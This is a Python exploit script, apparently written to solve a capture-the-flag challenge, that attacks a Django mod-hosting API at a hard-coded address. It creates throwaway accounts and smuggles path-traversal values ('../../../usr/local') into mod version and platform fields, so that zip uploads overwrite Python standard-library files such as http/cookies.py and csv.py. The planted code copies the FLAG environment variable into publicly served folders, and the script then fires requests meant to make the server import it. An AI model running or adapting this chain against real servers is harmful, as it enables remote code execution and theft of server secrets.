#!/usr/bin/env python3
"""
_t44_direct_probe.py
Test approach: write a fresh module to a location we CAN reach,
then test ALL known trigger mechanisms to find one that works.

Specifically test: what Python 3.11's zipfile module imports when processing zips.
Also test email-based triggers with Django multipart.
"""
import requests, sys, io, zipfile, secrets, time, re, struct, zlib

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://144.79.188.39:42166"
if not BASE.startswith("http"):
    BASE = "http://" + BASE

def fresh():
    u = "u" + secrets.token_hex(4)
    pw = "Pass12345!"
    requests.post(f"{BASE}/api/auth/register/", json={"username": u, "password": pw}, timeout=15)
    r = requests.post(f"{BASE}/api/auth/login/", json={"username": u, "password": pw}, timeout=15)
    return r.json()["access"], u

def H(tok):
    return {"Authorization": f"Bearer {tok}"}

def get_or_create_plat(tok, code, name="z"):
    r = requests.get(f"{BASE}/api/platforms/", headers=H(tok), timeout=15).json()
    for it in (r.get("results", r) if isinstance(r, dict) else r) or []:
        if isinstance(it, dict) and it.get("code") == code:
            return it["id"]
    return requests.post(f"{BASE}/api/platforms/", headers=H(tok),
        json={"code": code, "name": name}, timeout=15).json()["id"]

def plant(tok, mv, pc, filename, payload):
    pid = get_or_create_plat(tok, pc)
    mid = requests.post(f"{BASE}/api/mods/", headers=H(tok),
        json={"title":"z","mod_version":mv,"release_notes":"","is_enabled":True}, timeout=15).json()["id"]
    bid = requests.post(f"{BASE}/api/mods/{mid}/builds/", headers=H(tok),
        json={"platform": pid}, timeout=15).json()["id"]
    bio = io.BytesIO()
    with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(filename, payload if isinstance(payload, bytes) else payload.encode())
    bio.seek(0)
    r = requests.post(f"{BASE}/api/mods/{mid}/builds/{bid}/upload/", headers=H(tok),
        files={"zip_file": ("p.zip", bio, "application/zip")}, timeout=30)
    return r.status_code, mid, bid

OUT = "flag_" + secrets.token_hex(4) + ".txt"
SHIM = f"""import os as _o
try:
    open('/usr/share/nginx/html/{OUT}','w').write(_o.environ.get('FLAG','NOFLAG')+'\\n')
except Exception: pass
try:
    open('/data/media/{OUT}','w').write(_o.environ.get('FLAG','NOFLAG')+'\\n')
except Exception: pass
"""

print(f"[*] OUT={OUT}")

# Plant shims in multiple locations 
# 1. json/tool.py - accessed if /api/ has JSON tool
tok1, _ = fresh()
s1, *_ = plant(tok1, "../../../usr/local", "lib/python3.11/json", "tool.py", SHIM)
print(f"[1] plant json/tool.py -> {s1}")

# 2. http/cookies.py (already tried, likely cached)
tok2, _ = fresh()
s2, *_ = plant(tok2, "../../../usr/local", "lib/python3.11/http", "cookies.py", SHIM)
print(f"[2] plant http/cookies.py -> {s2}")

# 3. xml/etree/ElementTree.py - if XML parsing triggered
tok3, _ = fresh()
s3, *_ = plant(tok3, "../../../usr/local", "lib/python3.11/xml", "etree.py", SHIM)
print(f"[3] plant xml/etree.py (wrong loc but test) -> {s3}")

# 4. DIRECT: plant in /usr/local/lib/python3.11/ as csv.py (might be fresh)
tok4, _ = fresh()
s4, *_ = plant(tok4, "../../../../usr/local", "lib/python3.11", "csv.py", SHIM)
print(f"[4] plant /usr/local/lib/python3.11/csv.py -> {s4} (200=overwrite, 500=a-w dir)")

# 5. Plant in /data/ as a custom trigger
tok5, _ = fresh()
s5, *_ = plant(tok5, "../..", "", "trigger_test.py", b"# test\n")
print(f"[5] plant /data/media/ test -> {s5}")

# === TRIGGER EXPERIMENTS ===
print("\n[*] Triggering...")
tok_t, _ = fresh()

# T1: Schema generation (drf-spectacular)
r = requests.get(f"{BASE}/api/schema/", headers=H(tok_t), timeout=20)
print(f"  T1: GET /api/schema/ -> {r.status_code}")

# T2: Schema with YAML format (may trigger yaml module chain)
r = requests.get(f"{BASE}/api/schema/?format=yaml", headers=H(tok_t), timeout=20)
print(f"  T2: GET /api/schema/?format=yaml -> {r.status_code}")

# T3: Upload zip with 256+ files (triggers more internal processing)
pid_t = get_or_create_plat(tok_t, "trigall")
mid_t = requests.post(f"{BASE}/api/mods/", headers=H(tok_t),
    json={"title":"z","mod_version":"v_trig","release_notes":"","is_enabled":True}, timeout=15).json()["id"]
bid_t = requests.post(f"{BASE}/api/mods/{mid_t}/builds/", headers=H(tok_t),
    json={"platform": pid_t}, timeout=15).json()["id"]

# Upload a zip with many BZIP2-compressed entries to stress the module
bio_stress = io.BytesIO()
with zipfile.ZipFile(bio_stress, "w", zipfile.ZIP_BZIP2) as zf:
    for i in range(50):
        zf.writestr(f"file{i:03d}.txt", b"data" * 100)
bio_stress.seek(0)
r = requests.post(f"{BASE}/api/mods/{mid_t}/builds/{bid_t}/upload/",
    headers=H(tok_t), files={"zip_file": ("stress.zip", bio_stress, "application/zip")}, timeout=30)
print(f"  T3: upload BZIP2 stress zip -> {r.status_code}")

# T4: Try accessing /api/schema/?format=json explicitly
r = requests.get(f"{BASE}/api/schema/?format=json", headers=H(tok_t), timeout=20)
print(f"  T4: GET /api/schema/?format=json -> {r.status_code}")

# T5: Try mods with all entries
r = requests.get(f"{BASE}/api/mods/?page_size=100", headers=H(tok_t), timeout=20)
print(f"  T5: GET /api/mods/?page_size=100 -> {r.status_code}")

time.sleep(2)

# Check all outputs
print(f"\n[*] Checking {OUT}...")
for url, label in [(f"{BASE}/{OUT}", "nginx"), (f"{BASE}/media/{OUT}", "media")]:
    r = requests.get(url, timeout=10)
    if r.status_code == 200:
        m = re.search(r"PTITCTF\{[^}]+\}", r.text)
        print(f"  {label}: {r.text[:100]}")
        if m:
            print(f"\n>>> FLAG: {m.group(0)}")
    else:
        print(f"  {label}: {r.status_code}")
